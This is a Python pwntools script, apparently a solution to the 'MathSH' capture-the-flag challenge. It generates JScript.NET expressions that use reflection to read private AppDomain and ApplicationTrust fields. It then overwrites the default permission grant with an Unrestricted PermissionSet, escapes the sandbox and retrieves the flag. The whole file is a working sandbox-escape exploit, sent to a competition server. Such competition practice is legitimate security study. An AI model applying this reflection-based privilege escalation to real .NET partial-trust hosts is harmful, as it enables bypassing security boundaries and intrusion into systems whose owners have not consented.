#!/usr/bin/env python3
from pwn import *


def emit_null():
    return 'null'


def emit_bool(b):
    return 'true' if b else 'false'


def emit_string(expr):
    return '"' + expr.replace('"', '\\"') + '"'


def emit_eval(expr, target):
    return f'''eval({emit_string(expr)}, {target})'''


def emit_call(callable, *args):
    return f'''{callable}({', '.join(args)})'''


def emit_direct_method_call(object, method_name, *args):
    return emit_call(f'{object}.{method_name}', *args)


def emit_method_call(object, method_name, *args):
    return emit_eval(emit_call(method_name, *args), object)


def emit_field_access(object, field_name):
    return emit_eval(field_name, object)


def emit_type_delegator(name):
    return f'__global__.{name}'


def emit_type(name):
    return emit_field_access(emit_type_delegator(name), 'UnderlyingSystemType')


ENUM = emit_type_delegator('System.Enum')


def emit_enum_value(type, name):
    return emit_direct_method_call(ENUM, 'Parse', type, emit_string(name))


def emit_print(expr):
    return f'''memset({expr}, 0)'''


def emit_ctor(type, *args):
    return emit_call(type, *args)


def emit_array(*args):
    return emit_call('array', *args)


UTILS = emit_type_delegator('JScriptRunner.JScriptUtils')
ARG_TYPE_OBJECT = emit_string('')
ARG_TYPE_STRING = emit_string('')
ARG_TYPE_BOOL = emit_bool(False)
ARG_TYPE_ARRAY = emit_array()
ARG_TYPE_INT = '0'


def emit_utils_get_method(type, name, static_type, case_sensitive, non_public, arg_types):
    return emit_direct_method_call(
        UTILS,
        'GetMethod',
        type,
        emit_string(name),
        emit_bool(static_type),
        emit_bool(case_sensitive),
        emit_bool(non_public),
        emit_array(*arg_types),
    )


def emit_utils_call_method(method, target_object, args):
    return emit_direct_method_call(
        UTILS,
        'CallMethod',
        method,
        target_object,
        emit_array(*args),
    )


CALL_METHOD_SECURE = emit_utils_get_method(
    type=UTILS,
    name='CallMethodSecure',
    static_type=True,
    case_sensitive=False,
    non_public=True,
    arg_types=(ARG_TYPE_OBJECT, ARG_TYPE_STRING, ARG_TYPE_BOOL, ARG_TYPE_ARRAY),
)


def emit_utils_call_method_secure(target_object, name, *args):
    return emit_utils_call_method(
        method=CALL_METHOD_SECURE,
        target_object=emit_null(),
        args=(
            target_object,
            emit_string(name),
            emit_bool(False),  # case_sensitive
            emit_array(*args),
        ),
    )


def main():
    with remote('mathsh.2020.ctfcompetition.com', 1337) as tube:
        tube.recvuntil(b'MathSH> ')
        app_domain_type = emit_type_delegator('System.AppDomain')
        current_domain = f'{app_domain_type}.CurrentDomain'
        non_public_instance = emit_enum_value(
            emit_type('System.Reflection.BindingFlags'), 'NonPublic, Instance')
        application_trust_field = emit_method_call(
            app_domain_type,
            'GetField',
            emit_string('_applicationTrust'),
            non_public_instance,
        )
        application_trust = emit_utils_call_method_secure(
            application_trust_field, 'GetValue', current_domain)
        permission_set = emit_ctor(
            emit_type_delegator('System.Security.PermissionSet'),
            emit_enum_value(
                emit_type('System.Security.Permissions.PermissionState'),
                'Unrestricted',
            ),
        )
        application_trust_type = emit_type_delegator(
            'System.Security.Policy.ApplicationTrust')
        default_grant_field = emit_method_call(
            application_trust_type,
            'GetField',
            emit_string('m_psDefaultGrant'),
            non_public_instance,
        )
        get_default_grant = emit_utils_call_method_secure(
            default_grant_field, 'GetValue', application_trust)
        default_grant_xml = emit_method_call(get_default_grant, 'ToXml')
        print_default_grant = emit_print(default_grant_xml)
        print('<< ' + print_default_grant)
        tube.sendline(print_default_grant)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        full_trust_assemblies_field = emit_method_call(
            application_trust_type,
            'GetField',
            emit_string('m_fullTrustAssemblies'),
            non_public_instance,
        )
        get_full_trust_assemblies = emit_utils_call_method_secure(
            full_trust_assemblies_field, 'GetValue', application_trust)
        print_full_trust_assemblies = emit_field_access(
            get_full_trust_assemblies, 'Count')
        print_full_trust_assemblies = emit_call(
            'memset', emit_string('x'), print_full_trust_assemblies)
        print('<< ' + print_full_trust_assemblies)
        tube.sendline(print_full_trust_assemblies)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        memlist = emit_call('memlist')
        print('<< ' + memlist)
        tube.sendline(memlist)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        policy_statement = emit_ctor(
            emit_type_delegator('System.Security.Policy.PolicyStatement'),
            permission_set,
        )
        set_default_grant = emit_utils_call_method_secure(
            default_grant_field,
            'SetValue',
            application_trust,
            policy_statement,
        )
        print('<< ' + set_default_grant)
        tube.sendline(set_default_grant)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())

        flag = emit_ctor('__flag__')
        print('<< ' + flag)
        tube.sendline(flag)
        print('>> ' + tube.recvuntil(b'MathSH> ')[:-8].strip().decode())


if __name__ == '__main__':
    main()
